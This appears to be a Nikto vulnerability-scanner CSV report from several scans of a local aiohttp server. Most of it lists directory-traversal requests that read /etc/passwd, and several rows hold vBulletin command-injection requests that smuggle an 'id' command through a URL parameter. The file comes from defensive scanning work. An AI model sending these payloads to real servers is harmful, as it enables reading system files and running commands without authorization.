"Nikto - v2.1.5/2.1.5"
"localhost","127.0.0.1","80","","","","Python/3.11 aiohttp/3.8.6"
"localhost","127.0.0.1SCALAR(0x5654d290eba8)"80","OSVDB-0","GET","/","The anti-clickjacking X-Frame-Options header is not present."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-5553","GET","/netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd","/netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd: Sybex E-Trainer allows arbitrary files to be retrieved."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-9028","GET","/autohtml.php?op=modload&mainfile=x&name=/etc/passwd","/autohtml.php?op=modload&mainfile=x&name=/etc/passwd: php-proxima 6.0 and below allows arbitrary files to be retrieved."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-49354","GET","/atomicboard/index.php?location=../../../../../../../../../../etc/passwd","/atomicboard/index.php?location=../../../../../../../../../../etc/passwd: AtomicBoard v0.6.2 allows remote users to read arbitrary files."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-54099","GET","/current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1","/current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1: w-agora 4.1.5 allows any file to be retrieved from the remote host."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-3012","GET","/current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00","/current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00: w-agora 4.1.5 allows any file to be retrieved from the remote host."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-54058","GET","/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00","/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: Typo3 allows any file to be retrieved remotely. Upgrade to the latest version."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-59600","GET","/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1","/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1: eZ httpbench version 1.1 allows any file on the remote server to be retrieved."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-2870","GET","/index.php?download=/etc/passwd","/index.php?download=/etc/passwd: Snif 1.2.4 allows any file to be retrieved from the web server."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-59085","GET","/index.php?|=../../../../../../../../../etc/passwd","/index.php?|=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-0","GET","/index.php?page=../../../../../../../../../../etc/passwd","/index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)"
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-59085","GET","/index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd","/index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-0","GET","/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd","/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd: Default JRun CGI lets users read any system file."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-51750","GET","/k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor","/k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor: Kebi Academy 2001 Web Solution allows any file to be retrieved from the remote system."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-0","GET","/nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0","/nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0: nCUBE Server Manage 1.0 allows any file to be read on the remote system."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-2829","GET","/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd","/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd: phpWebFileManager v2.0.0 and prior are vulnerable to a directory traversal bug."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-0","GET","/phptonuke.php?filnavn=/etc/passwd","/phptonuke.php?filnavn=/etc/passwd: Photonouke or myphpnuke allows arbitrary files to be retrieved from the remote host."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-0","GET","/put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd","/put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd: NCR's Terradata server contains a CGI that allows any file to be retrieved remotely."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-521","GET","/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00","/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00: The ROADS search.pl allows attackers to retrieve system files."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-0","GET","/support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd","/support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd: This CGI allows attackers to read files on the host."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-0","GET","/viewpage.php?file=/etc/passwd","/viewpage.php?file=/etc/passwd: PHP-Nuke script viewpage.php allows any file to be retrieved from the remote system."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-431","GET","/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html","/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html: eXtropia's Web Store lets attackers read any file on the system by appending a %00.html to the name."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-9055","GET","/webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif","/webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif: Wolfram Research's webMathematica allows any file to be read on the remote system. Upgrade to the latest version on http://www.wolfram.com/"
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-17110","GET","/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00","/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00: The Novell Groupwise WebAcc Servlet allows attackers to view arbitrary files on the server."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-0","GET","/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd","/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd: Webcalendar 0.9.41 and below allow remote users to read arbitrary files."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-56290","GET","/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd","/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd: EditTag allows arbitrary file retrieval."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-8983","GET","/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1","/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1: Remote file retrieval."
"localhost","127.0.0.1SCALAR(0x5596c435f1d8)"80","OSVDB-0","GET","/search?NS-query-pat=../../../../../../../../../../etc/passwd","/search?NS-query-pat=../../../../../../../../../../etc/passwd: The iPlanet server allows arbitrary files to be retrieved through the search functionality. Install 4.1 SP10+ or 6.0 SP3+"
"localhost","127.0.0.1","80","","","","Python/3.11 aiohttp/3.8.6"
"localhost","127.0.0.1SCALAR(0x55a56185df18)"80","OSVDB-0","GET","/","The anti-clickjacking X-Frame-Options header is not present."
"localhost","127.0.0.1SCALAR(0x55a56185df18)"80","OSVDB-0","GET","/","Cookie sess_uuid created without the httponly flag"
"localhost","127.0.0.1SCALAR(0x55a56185df18)"80","OSVDB-27487","GET","/","Apache is vulnerable to XSS via the Expect header"
"localhost","127.0.0.1","80","","","","Python/3.11 aiohttp/3.8.6"
"localhost","127.0.0.1SCALAR(0x563299ee3ce8)"80","OSVDB-0","GET","/","The anti-clickjacking X-Frame-Options header is not present."
"localhost","127.0.0.1SCALAR(0x563299ee3ce8)"80","OSVDB-0","GET","/","Cookie sess_uuid created without the httponly flag"
"localhost","127.0.0.1SCALAR(0x563299ee3ce8)"80","OSVDB-27487","GET","/","Apache is vulnerable to XSS via the Expect header"
"localhost","127.0.0.1SCALAR(0x563299ee3ce8)"80","OSVDB-3299","GET","/forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22","/forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html"
"localhost","127.0.0.1SCALAR(0x563299ee3ce8)"80","OSVDB-3299","GET","/forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22","/forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html"
"localhost","127.0.0.1SCALAR(0x563299ee3ce8)"80","OSVDB-3299","GET","/htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22","/htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html"
"localhost","127.0.0.1SCALAR(0x563299ee3ce8)"80","OSVDB-3299","GET","/vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22","/vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html"
"localhost","127.0.0.1SCALAR(0x563299ee3ce8)"80","OSVDB-3299","GET","/vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22","/vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html"
"localhost","127.0.0.1","80","","","","Python/3.11 aiohttp/3.8.6"
"localhost","127.0.0.1SCALAR(0x55f2993f0548)"80","OSVDB-0","GET","/","The anti-clickjacking X-Frame-Options header is not present."
"localhost","127.0.0.1SCALAR(0x55f2993f0548)"80","OSVDB-0","GET","/","Cookie sess_uuid created without the httponly flag"
"localhost","127.0.0.1SCALAR(0x55f2993f0548)"80","OSVDB-27487","GET","/","Apache is vulnerable to XSS via the Expect header"
"localhost","127.0.0.1","80","","","","Python/3.11 aiohttp/3.8.6"
"localhost","127.0.0.1SCALAR(0x55e6044b0288)"80","OSVDB-0","GET","/","The anti-clickjacking X-Frame-Options header is not present."
"localhost","127.0.0.1SCALAR(0x55e6044b0288)"80","OSVDB-0","GET","/","Cookie sess_uuid created without the httponly flag"
"localhost","127.0.0.1SCALAR(0x55e6044b0288)"80","OSVDB-27487","GET","/","Apache is vulnerable to XSS via the Expect header"
